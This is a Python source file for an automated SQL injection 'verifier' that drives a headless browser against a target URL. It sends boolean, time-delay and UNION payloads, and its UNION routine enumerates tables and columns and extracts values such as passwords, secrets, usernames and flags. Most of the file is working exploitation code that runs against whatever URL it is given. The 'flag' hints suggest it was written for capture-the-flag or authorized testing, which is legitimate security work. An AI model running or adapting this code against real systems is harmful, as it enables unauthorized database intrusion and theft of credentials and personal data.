"""
SQL Injection Verifier v2.0

Proper SQLi verification that actually tests exploitation, not just error detection.

Key improvements:
1. Boolean-based: Tests BOTH true and false conditions (not just response diff)
2. Time-based: Verifies delay matches expected duration
3. UNION-based: Attempts actual data extraction
4. Error-based: Verifies errors are NEW and reveal information
"""
import asyncio
import logging
import re
import time
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple
from playwright.async_api import async_playwright
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from ..models import (
    SQLiVerificationResult,
    SQLiType,
    DatabaseType
)


class SQLiVerifierAgentV2:
    """Proper SQL injection verification with exploitation testing"""

    # SQL error patterns (database-specific)
    SQL_ERROR_PATTERNS = {
        DatabaseType.MYSQL: [
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"MySQLSyntaxErrorException",
            r"MySQL server version"
        ],
        DatabaseType.POSTGRESQL: [
            r"PostgreSQL.*ERROR",
            r"PSQLException",
            r"org\.postgresql",
            r"unterminated quoted string"
        ],
        DatabaseType.MSSQL: [
            r"Microsoft SQL Server.*error",
            r"ODBC SQL Server Driver",
            r"SqlException",
            r"Incorrect syntax near"
        ],
        DatabaseType.ORACLE: [
            r"ORA-\d{5}",
            r"Oracle.*error",
            r"OracleException"
        ],
        DatabaseType.SQLITE: [
            r"SQLite.*error",
            r"sqlite3\.OperationalError"
        ]
    }

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)
        self.screenshot_dir = Path("screenshots")
        self.screenshot_dir.mkdir(exist_ok=True)
        self.html_captures_dir = Path("html_captures")
        self.html_captures_dir.mkdir(exist_ok=True)

    async def verify_boolean_based(
        self,
        target_url: str,
        parameter: str,
        parameter_location: str = "query"
    ) -> SQLiVerificationResult:
        """
        Verify boolean-based blind SQLi by testing TRUE vs FALSE conditions.

        This is the PROPER way to detect boolean blind SQLi:
        1. Test with TRUE condition (e.g., ' OR 1=1--)
        2. Test with FALSE condition (e.g., ' AND 1=2--)
        3. Verify responses are DIFFERENT
        4. Test multiple times to ensure consistency

        Returns:
            SQLiVerificationResult
        """
        self.logger.info(f"[BOOLEAN] Testing boolean-based SQLi on {parameter}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                # Get baseline (normal query)
                baseline_html = await self._fetch_response(page, target_url, parameter, "1", parameter_location)
                baseline_len = len(baseline_html)
                self.logger.info(f"[BOOLEAN] Baseline length: {baseline_len}")

                # Test TRUE condition - should return data
                true_payloads = [
                    "' OR '1'='1",
                    "' OR 1=1--",
                    "%' OR 1=1--",
                    "' OR 'x'='x"
                ]

                # Test FALSE condition - should return nothing/less data
                false_payloads = [
                    "' AND '1'='2",
                    "' AND 1=2--",
                    "%' AND 1=2--",
                    "' AND 'x'='y"
                ]

                for true_payload, false_payload in zip(true_payloads, false_payloads):
                    self.logger.info(f"[BOOLEAN] Testing: TRUE='{true_payload}' vs FALSE='{false_payload}'")

                    # Fetch TRUE response
                    true_html = await self._fetch_response(page, target_url, parameter, true_payload, parameter_location)
                    true_len = len(true_html)

                    # Fetch FALSE response
                    false_html = await self._fetch_response(page, target_url, parameter, false_payload, parameter_location)
                    false_len = len(false_html)

                    self.logger.info(f"[BOOLEAN] Lengths: baseline={baseline_len}, true={true_len}, false={false_len}")

                    # Check for SQL errors (indicates injection but not exploitation)
                    true_has_error = self._has_sql_error(true_html)
                    false_has_error = self._has_sql_error(false_html)

                    if true_has_error or false_has_error:
                        self.logger.warning(f"[BOOLEAN] SQL errors detected - injection works but not exploitable")
                        continue

                    # IMPROVED VERIFICATION WITH CONSISTENCY CHECKS:
                    # TRUE should return MORE data than FALSE
                    # But we need to verify this is CONSISTENT across multiple tests
                    if true_len > false_len and true_len > baseline_len:
                        diff_true_false = true_len - false_len
                        diff_true_baseline = true_len - baseline_len

                        # Significant difference indicates POTENTIAL boolean SQLi
                        if diff_true_false > (baseline_len * 0.15):  # 15% difference
                            self.logger.info(f"[?] Potential boolean SQLi detected")
                            self.logger.info(f"    TRUE returns {diff_true_false} more bytes than FALSE")
                            self.logger.info(f"    Running consistency checks...")

                            # CONSISTENCY CHECK: Test with alternative TRUE/FALSE payloads
                            # If this is real SQLi, ALL true conditions should return more data
                            alternative_tests = [
                                ("' OR 1=1 --", "' AND 1=2 --"),
                                ("' OR 'x'='x", "' AND 'x'='y"),
                            ]

                            consistent_results = 1  # Already have 1 positive result
                            total_checks = 1

                            for alt_true, alt_false in alternative_tests:
                                try:
                                    alt_true_html = await self._fetch_response(page, target_url, parameter, alt_true, parameter_location)
                                    alt_false_html = await self._fetch_response(page, target_url, parameter, alt_false, parameter_location)

                                    alt_true_len = len(alt_true_html)
                                    alt_false_len = len(alt_false_html)

                                    total_checks += 1

                                    # Check if pattern holds
                                    if alt_true_len > alt_false_len and alt_true_len > baseline_len:
                                        alt_diff = alt_true_len - alt_false_len
                                        if alt_diff > (baseline_len * 0.15):
                                            consistent_results += 1
                                            self.logger.info(f"    ✓ Consistency check {total_checks-1}: TRUE > FALSE ({alt_diff} bytes)")
                                        else:
                                            self.logger.warning(f"    ✗ Consistency check {total_checks-1}: Difference too small ({alt_diff} bytes)")
                                    else:
                                        self.logger.warning(f"    ✗ Consistency check {total_checks-1}: Pattern doesn't hold")
                                except Exception as e:
                                    self.logger.warning(f"    ✗ Consistency check failed: {e}")
                                    total_checks += 1

                            # Calculate consistency ratio
                            consistency_ratio = consistent_results / total_checks

                            self.logger.info(f"[BOOLEAN] Consistency: {consistent_results}/{total_checks} tests passed ({consistency_ratio:.0%})")

                            # STRICTER REQUIREMENTS:
                            # - Need at least 2 out of 3 tests to pass (66.67% consistency)
                            # - Adjust confidence based on consistency ratio
                            # FIX: Use >= 2 tests passed (not >= 0.67 ratio) to avoid rounding issues
                            if consistent_results >= 2:
                                # Calculate confidence based on consistency
                                if consistency_ratio == 1.0:
                                    # 100% consistency = HIGH confidence
                                    confidence = 85
                                    self.logger.info(f"[✓✓] BOOLEAN SQLI CONFIRMED (100% consistency)")
                                elif consistency_ratio >= 0.8:
                                    # 80%+ consistency = MEDIUM-HIGH confidence
                                    confidence = 75
                                    self.logger.info(f"[✓] BOOLEAN SQLI LIKELY ({int(consistency_ratio*100)}% consistency)")
                                else:
                                    # 67%-79% consistency = MEDIUM confidence
                                    confidence = 60
                                    self.logger.info(f"[?] BOOLEAN SQLI POSSIBLE ({int(consistency_ratio*100)}% consistency)")

                                self.logger.info(f"    {consistent_results}/{total_checks} tests showed TRUE > FALSE pattern")
                                self.logger.info(f"    Confidence: {confidence}%")

                                # Take screenshot
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                screenshot_path = self.screenshot_dir / f"sqli_boolean_{timestamp}.png"
                                await page.screenshot(path=str(screenshot_path), full_page=True)

                                return SQLiVerificationResult(
                                    url=target_url,
                                    parameter=parameter,
                                    payload=true_payload,
                                    vulnerable=True,
                                    injection_type=SQLiType.BOOLEAN_BLIND,
                                    confidence=confidence,
                                    database_type=DatabaseType.UNKNOWN,
                                    error_messages=[
                                        f"TRUE condition returns {diff_true_false} more bytes than FALSE",
                                        f"Consistency: {consistent_results}/{total_checks} tests passed ({int(consistency_ratio*100)}%)"
                                    ],
                                    response_time=0,
                                    baseline_time=0,
                                    response_diff={
                                        'true_len': true_len,
                                        'false_len': false_len,
                                        'baseline_len': baseline_len,
                                        'consistency_ratio': consistency_ratio
                                    },
                                    timestamp=timestamp,
                                    screenshot_path=str(screenshot_path)
                                )
                            else:
                                self.logger.warning(f"[✗] INSUFFICIENT CONSISTENCY - likely false positive")
                                self.logger.warning(f"    Only {consistent_results}/{total_checks} tests passed (need ≥2 tests)")
                                self.logger.warning(f"    Site likely returns different content naturally")

                # No working boolean SQLi found
                return self._create_negative_result(target_url, parameter, "Boolean-based test")

            finally:
                await browser.close()

    async def verify_time_based(
        self,
        target_url: str,
        parameter: str,
        parameter_location: str = "query"
    ) -> SQLiVerificationResult:
        """
        Verify time-based blind SQLi by testing actual delays.

        Proper verification:
        1. Test with SLEEP(5) - should delay 5 seconds
        2. Test with SLEEP(0) - should NOT delay
        3. Verify delay matches expected duration
        """
        self.logger.info(f"[TIME] Testing time-based blind SQLi on {parameter}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                # Test baseline (no delay)
                start = time.time()
                await self._fetch_response(page, target_url, parameter, "1", parameter_location)
                baseline_time = time.time() - start
                self.logger.info(f"[TIME] Baseline time: {baseline_time:.2f}s")

                # Time-based payloads for different databases
                payloads = [
                    ("' AND SLEEP(5)--", 5, "MySQL"),
                    ("' AND pg_sleep(5)--", 5, "PostgreSQL"),
                    ("'; WAITFOR DELAY '0:0:5'--", 5, "MSSQL"),
                    ("%' AND SLEEP(5)--", 5, "MySQL LIKE"),
                    ("%' AND pg_sleep(5)--", 5, "PostgreSQL LIKE"),
                ]

                for payload, expected_delay, db_name in payloads:
                    self.logger.info(f"[TIME] Testing {db_name} payload: {payload}")

                    start = time.time()
                    html = await self._fetch_response(page, target_url, parameter, payload, parameter_location, timeout=20000)
                    actual_delay = time.time() - start

                    delay_diff = actual_delay - baseline_time

                    self.logger.info(f"[TIME] Delay: {delay_diff:.2f}s (expected: {expected_delay}s)")

                    # Check if delay matches expected (within 1 second tolerance)
                    if abs(delay_diff - expected_delay) < 1.5:
                        self.logger.info(f"[✓] TIME-BASED SQLI CONFIRMED!")
                        self.logger.info(f"    Delay matches expected duration ({expected_delay}s)")

                        # Verify with SLEEP(0) to confirm
                        zero_payload = payload.replace(f"({expected_delay})", "(0)")
                        start = time.time()
                        await self._fetch_response(page, target_url, parameter, zero_payload, parameter_location)
                        zero_delay = time.time() - start

                        if zero_delay < baseline_time + 2:
                            self.logger.info(f"[✓] SLEEP(0) confirmed - no delay as expected")

                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                            screenshot_path = self.screenshot_dir / f"sqli_time_{timestamp}.png"
                            await page.screenshot(path=str(screenshot_path), full_page=True)

                            # Detect database type
                            db_type = DatabaseType.UNKNOWN
                            if "MySQL" in db_name:
                                db_type = DatabaseType.MYSQL
                            elif "PostgreSQL" in db_name:
                                db_type = DatabaseType.POSTGRESQL
                            elif "MSSQL" in db_name:
                                db_type = DatabaseType.MSSQL

                            return SQLiVerificationResult(
                                url=target_url,
                                parameter=parameter,
                                payload=payload,
                                vulnerable=True,
                                injection_type=SQLiType.TIME_BLIND,
                                confidence=95,
                                database_type=db_type,
                                error_messages=[f"Response delayed by {delay_diff:.2f} seconds (expected {expected_delay}s)"],
                                response_time=actual_delay,
                                baseline_time=baseline_time,
                                timestamp=timestamp,
                                screenshot_path=str(screenshot_path)
                            )

                # No time-based SQLi found
                return self._create_negative_result(target_url, parameter, "Time-based test")

            finally:
                await browser.close()

    def _analyze_query_structure(self, error_html: str) -> str:
        """
        Learn the query structure by analyzing SQL error messages.

        Examples:
        - "WHERE (col LIKE '%value%')" → bracketed_like
        - "WHERE (col = value)" → bracketed
        - "WHERE col = 'value'" → standard
        """
        # Look for query structure clues in error messages
        if re.search(r"LIKE\s+['\"]%.*%['\"]", error_html, re.IGNORECASE):
            self.logger.info("[LEARN] Query uses LIKE with wildcards and brackets")
            return "bracketed_like"
        elif re.search(r"\(.*\)", error_html) and "LIKE" in error_html.upper():
            self.logger.info("[LEARN] Query uses bracketed expression with LIKE")
            return "bracketed_like"
        elif re.search(r"\(.*=.*\)", error_html):
            self.logger.info("[LEARN] Query uses bracketed expression")
            return "bracketed"
        else:
            return "standard"

    async def _extract_context_hints(self, html: str) -> Dict[str, List[str]]:
        """
        Extract context hints from HTML about database structure.

        Examples:
        - "The flag is in table X, column Y"
        - "Data stored in users table"
        - "Check the products table for details"
        """
        hints = {
            'tables': [],
            'columns': []
        }

        # Look for explicit table mentions
        table_patterns = [
            r"table\s+['\"]?(\w+)['\"]?",
            r"in\s+(?:the\s+)?(?:database\s+)?table\s+['\"]?(\w+)['\"]?",
            r"from\s+(?:the\s+)?table\s+['\"]?(\w+)['\"]?",
        ]

        # Look for explicit column mentions
        column_patterns = [
            r"column\s+['\"]?(\w+)['\"]?",
            r"field\s+['\"]?(\w+)['\"]?",
        ]

        for pattern in table_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            hints['tables'].extend([m.lower() for m in matches if len(m) > 2])

        for pattern in column_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            hints['columns'].extend([m.lower() for m in matches if len(m) > 2])

        # Remove duplicates and common words
        hints['tables'] = list(set([t for t in hints['tables'] if t not in ['the', 'a', 'an', 'database']]))
        hints['columns'] = list(set([c for c in hints['columns'] if c not in ['the', 'a', 'an']]))

        if hints['tables']:
            self.logger.info(f"[CONTEXT] HTML hints - tables: {', '.join(hints['tables'][:5])}")
        if hints['columns']:
            self.logger.info(f"[CONTEXT] HTML hints - columns: {', '.join(hints['columns'][:5])}")

        return hints

    async def verify_union_based(
        self,
        target_url: str,
        parameter: str,
        parameter_location: str = "query"
    ) -> SQLiVerificationResult:
        """
        Verify UNION-based SQLi by attempting data extraction.

        Proper verification:
        1. Parse HTML for context hints about database structure
        2. Find number of columns with ORDER BY
        3. Try to extract data from hinted tables/columns first
        4. Fall back to generic extraction if no hints
        5. Return the actual extracted data
        """
        self.logger.info(f"[UNION] Testing UNION-based SQLi on {parameter}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context = await browser.new_context()
            page = await context.new_page()

            try:
                # First, load the page to extract context hints
                # Use 'load' for better reliability
                try:
                    await page.goto(target_url, wait_until='load', timeout=15000)
                except Exception as e1:
                    self.logger.warning(f"[UNION] Load timeout, trying domcontentloaded: {str(e1)[:60]}")
                    try:
                        await page.goto(target_url, wait_until='domcontentloaded', timeout=10000)
                    except Exception as e2:
                        self.logger.error(f"[UNION] Page won't load, skipping UNION test: {str(e2)[:60]}")
                        return self._create_negative_result(target_url, parameter, "UNION test (page timeout)")

                html_context = await page.content()
                hints = await self._extract_context_hints(html_context)

                # LEARN from error messages by trying a test payload
                self.logger.info("[UNION] Learning query structure from error messages...")
                test_payload = "'"
                error_html = await self._fetch_response(page, target_url, parameter, test_payload, parameter_location)

                # Detect query structure from error message
                query_structure = self._analyze_query_structure(error_html)
                self.logger.info(f"[UNION] Detected query structure: {query_structure}")

                # Try to find column count with appropriate prefix based on query structure
                col_count = None
                successful_prefix = "'"

                # Build prefix variations based on detected structure
                if query_structure == "bracketed_like":
                    # Query like: WHERE (col LIKE '%input%')
                    # Try multiple variations - comment style, spacing, encoding
                    prefixes_to_try = [
                        "%')",          # Close LIKE wildcard, quote, and bracket
                        "%') ",         # With space before UNION
                        "%')+",         # URL-encoded space
                        "%')%20",       # URL-encoded space alternative
                        "%25')",        # URL-encoded wildcard
                        "%25') ",       # URL-encoded wildcard with space
                    ]
                elif query_structure == "bracketed":
                    # Query like: WHERE (col = input)
                    prefixes_to_try = ["1)", "')", "1')", "') ", "1') "]
                else:
                    # Standard query
                    prefixes_to_try = ["'", "' ", "1", "1 "]

                self.logger.info(f"[UNION] Trying prefixes: {prefixes_to_try}")

                # Try different comment styles
                comment_styles = ["--", "-- -", "#", "/**/--"]

                for prefix in prefixes_to_try:
                    for comment in comment_styles:
                        for test_cols in range(1, 10):
                            payload = f"{prefix} UNION SELECT {','.join(['NULL'] * test_cols)}{comment}"
                            html = await self._fetch_response(page, target_url, parameter, payload, parameter_location)

                            # Check for errors - if NO error, we found the right column count
                            if not self._has_sql_error(html):
                                col_count = test_cols
                                successful_prefix = prefix
                                self.logger.info(f"[✓] Found {col_count} columns using prefix: {prefix}, comment: {comment}")
                                break

                        if col_count:
                            break

                    if col_count:
                        break

                if col_count is None:
                    self.logger.info("[UNION] Could not determine column count")
                    return self._create_negative_result(target_url, parameter, "UNION-based test")

                # Now try to extract real data
                # For 1 column: ' UNION SELECT table_name FROM information_schema.tables--
                # For multiple columns: ' UNION SELECT NULL,table_name,NULL FROM ...--

                extraction_payloads = []

                # PostgreSQL - Extract table names (use learned prefix)
                if col_count == 1:
                    extraction_payloads.extend([
                        f"{successful_prefix} UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--",
                        f"{successful_prefix} UNION SELECT tablename FROM pg_tables WHERE schemaname='public'--",
                        f"{successful_prefix} UNION SELECT version()--",
                        f"{successful_prefix} UNION SELECT current_database()--",
                    ])
                else:
                    # Place data extraction in different column positions
                    for pos in range(col_count):
                        nulls_before = ['NULL'] * pos
                        nulls_after = ['NULL'] * (col_count - pos - 1)
                        parts = nulls_before + ['table_name'] + nulls_after
                        extraction_payloads.append(f"' UNION SELECT {','.join(parts)} FROM information_schema.tables WHERE table_schema='public'--")

                        parts = nulls_before + ['tablename'] + nulls_after
                        extraction_payloads.append(f"' UNION SELECT {','.join(parts)} FROM pg_tables WHERE schemaname='public'--")

                        parts = nulls_before + ['version()'] + nulls_after
                        extraction_payloads.append(f"' UNION SELECT {','.join(parts)}--")

                self.logger.info(f"[UNION] Attempting to extract table names...")

                for extract_payload in extraction_payloads[:15]:  # Test first 15
                    self.logger.debug(f"[UNION] Trying: {extract_payload[:80]}...")
                    extract_html = await self._fetch_response(page, target_url, parameter, extract_payload, parameter_location)

                    # Extract ALL new paragraphs that appeared (these are table names)
                    new_paragraphs = re.findall(r'<p>([^<]+)</p>', extract_html)
                    baseline_paragraphs = re.findall(r'<p>([^<]+)</p>', html_context)

                    # Find NEW content (table names extracted from DB)
                    found_tables = [p.strip() for p in new_paragraphs
                                   if p.strip() not in baseline_paragraphs
                                   and len(p.strip()) > 2
                                   and p.strip() not in ['Lorem ipsum dolor sit amet, consectetur adipiscing elit.', 'Fusce ut pellentesque urna.']]

                    if found_tables:
                        # Found table names! Now LEARN: enumerate columns, then extract data
                        unique_tables = list(set([t.lower() for t in found_tables]))
                        self.logger.info(f"[✓] Found tables: {', '.join(unique_tables[:5])}")

                        # Merge discovered tables with context hints
                        all_tables = list(set(unique_tables + hints.get('tables', [])))

                        # Filter out system tables
                        interesting_tables = [t for t in all_tables if t not in ['information_schema', 'pg_catalog']]
                        if not interesting_tables:
                            interesting_tables = all_tables

                        # Prioritize hinted tables first
                        tables_to_try = hints.get('tables', []) + [t for t in interesting_tables if t not in hints.get('tables', [])]

                        extracted_data_list = []
                        final_payload = extract_payload

                        # ITERATIVE LEARNING: For each table, find columns, then extract data
                        for table_name in tables_to_try[:10]:  # Try first 10 tables
                            self.logger.info(f"[UNION] Step 1: Enumerating columns from '{table_name}' table...")

                            # Step 1: Find column names for this table (use learned prefix)
                            column_enum_payload = f"{successful_prefix} UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}'--"
                            column_html = await self._fetch_response(page, target_url, parameter, column_enum_payload, parameter_location)

                            # Extract column names from response
                            new_paragraphs = re.findall(r'<p>([^<]+)</p>', column_html)
                            baseline_paragraphs = re.findall(r'<p>([^<]+)</p>', html_context)
                            discovered_columns = [p.strip() for p in new_paragraphs if p.strip() not in baseline_paragraphs and len(p.strip()) > 2 and p.strip() not in ['Lorem ipsum dolor sit amet, consectetur adipiscing elit.', 'Fusce ut pellentesque urna.']]

                            if discovered_columns:
                                self.logger.info(f"[✓] Found columns in '{table_name}': {', '.join(discovered_columns[:5])}")

                                # Step 2: Extract data from discovered columns
                                self.logger.info(f"[UNION] Step 2: Extracting data from '{table_name}' columns...")

                                for col_name in discovered_columns[:10]:  # Try first 10 columns
                                    data_payload = f"{successful_prefix} UNION SELECT {col_name} FROM {table_name}--"
                                    data_html = await self._fetch_response(page, target_url, parameter, data_payload, parameter_location)

                                    # Extract NEW data
                                    data_paragraphs = re.findall(r'<p>([^<]+)</p>', data_html)
                                    new_data = [p.strip() for p in data_paragraphs if p.strip() not in baseline_paragraphs and len(p.strip()) > 3]

                                    if new_data:
                                        extracted_data_list.extend(new_data)
                                        final_payload = data_payload
                                        self.logger.info(f"[✓✓✓] DATA EXTRACTED!")
                                        self.logger.info(f"    Table: {table_name}, Column: {col_name}")
                                        for d in new_data[:5]:
                                            self.logger.info(f"    → {d}")
                                        break  # Found data in this column

                                if extracted_data_list:
                                    break  # Found data, stop trying more tables
                            else:
                                # Fallback: No columns found, try common column names
                                self.logger.info(f"[UNION] No columns discovered, trying common names on '{table_name}'...")

                            # Build column list: context hints first, then common names
                            columns_to_try = hints.get('columns', []) + ['flag', 'value', 'data', 'content', 'secret', 'password', 'message', 'text', 'name', 'username', 'email']

                            # Try different approaches to extract actual data
                            data_extraction_payloads = []
                            if col_count == 1:
                                # For single column, try all column names
                                for col in columns_to_try[:15]:  # Try first 15 columns
                                    data_extraction_payloads.append(f"' UNION SELECT {col} FROM {table_name}--")
                                # Also try selecting all columns
                                data_extraction_payloads.append(f"' UNION SELECT * FROM {table_name}--")
                            else:
                                # For multiple columns
                                for col in ['flag', 'value', 'data', 'content', 'secret']:
                                    for pos in range(col_count):
                                        nulls_before = ['NULL'] * pos
                                        nulls_after = ['NULL'] * (col_count - pos - 1)
                                        parts = nulls_before + [col] + nulls_after
                                        data_extraction_payloads.append(f"' UNION SELECT {','.join(parts)} FROM {table_name}--")

                            # Try to extract actual data
                            for data_payload in data_extraction_payloads[:20]:
                                self.logger.debug(f"[UNION] Extracting data: {data_payload[:80]}...")
                                data_html = await self._fetch_response(page, target_url, parameter, data_payload, parameter_location)

                                # Check if we got NEW content (not in baseline)
                                # Extract all <p> tags to see if new data appeared
                                new_paragraphs = re.findall(r'<p>([^<]+)</p>', data_html)

                                # Filter out the original content that was already there
                                baseline_paragraphs = re.findall(r'<p>([^<]+)</p>', html_context)

                                # Find NEW data that wasn't in the baseline
                                new_data = [p.strip() for p in new_paragraphs if p.strip() not in baseline_paragraphs and len(p.strip()) > 3]

                                if new_data:
                                    # We extracted something new!
                                    extracted_data_list.extend(new_data)
                                    final_payload = data_payload
                                    self.logger.info(f"[✓✓✓] DATA EXTRACTED FROM DATABASE!")
                                    self.logger.info(f"    Table: {table_name}, Column: {data_payload.split('SELECT')[1].split('FROM')[0].strip()}")
                                    for d in new_data[:3]:
                                        self.logger.info(f"    → {d}")
                                    break

                                if extracted_data_list:
                                    break

                            # If we found data, stop trying other tables
                            if extracted_data_list:
                                break

                        # Compile all extracted data
                        if extracted_data_list:
                            extracted_data = ', '.join(list(set(extracted_data_list))[:3])
                        else:
                            extracted_data = ', '.join(unique_tables[:5])

                        self.logger.info(f"[✓] UNION SQLI CONFIRMED - REAL DATA EXTRACTED!")
                        self.logger.info(f"    Extracted: {extracted_data}")

                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        screenshot_path = self.screenshot_dir / f"sqli_union_{timestamp}.png"
                        await page.screenshot(path=str(screenshot_path), full_page=True)

                        # Save HTML for inspection
                        html_path = self.html_captures_dir / f"sqli_union_{timestamp}.html"
                        with open(html_path, 'w') as f:
                            f.write(f"<!-- Payload: {final_payload} -->\n")
                            f.write(extract_html if not extracted_data_list else data_html)

                        return SQLiVerificationResult(
                            url=target_url,
                            parameter=parameter,
                            payload=final_payload,
                            vulnerable=True,
                            injection_type=SQLiType.UNION_BASED,
                            confidence=100,
                            database_type=DatabaseType.POSTGRESQL,
                            error_messages=[f"Extracted real data: {extracted_data}"],
                            timestamp=timestamp,
                            screenshot_path=str(screenshot_path)
                        )

                return self._create_negative_result(target_url, parameter, "UNION-based test")

            finally:
                await browser.close()

    async def _fetch_response(
        self,
        page,
        url: str,
        parameter: str,
        payload: str,
        location: str,
        timeout: int = 15000
    ) -> str:
        """Fetch response with given payload"""
        try:
            if location == "query":
                test_url = self._inject_payload(url, parameter, payload)
                try:
                    await page.goto(test_url, wait_until='load', timeout=timeout)
                except:
                    await page.goto(test_url, wait_until='domcontentloaded', timeout=timeout - 5000)
            else:
                # POST
                try:
                    await page.goto(url, wait_until='load', timeout=timeout)
                except:
                    await page.goto(url, wait_until='domcontentloaded', timeout=timeout - 5000)
                await page.fill(f'input[name="{parameter}"]', payload)
                submit_btn = await page.query_selector('button[type="submit"], input[type="submit"]')
                if submit_btn:
                    await submit_btn.click()
                    await page.wait_for_load_state('networkidle', timeout=timeout)

            return await page.content()

        except Exception as e:
            self.logger.debug(f"Fetch error: {e}")
            return ""

    def _inject_payload(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[parameter] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    def _has_sql_error(self, html: str) -> bool:
        """Check if response contains SQL error"""
        for patterns in self.SQL_ERROR_PATTERNS.values():
            for pattern in patterns:
                if re.search(pattern, html, re.IGNORECASE):
                    return True
        return False

    def _create_negative_result(self, url: str, parameter: str, test_type: str) -> SQLiVerificationResult:
        """Create negative result"""
        return SQLiVerificationResult(
            url=url,
            parameter=parameter,
            payload="",
            vulnerable=False,
            injection_type=SQLiType.UNKNOWN,
            confidence=0,
            error_messages=[f"{test_type} did not confirm SQLi"],
            timestamp=datetime.now().isoformat()
        )
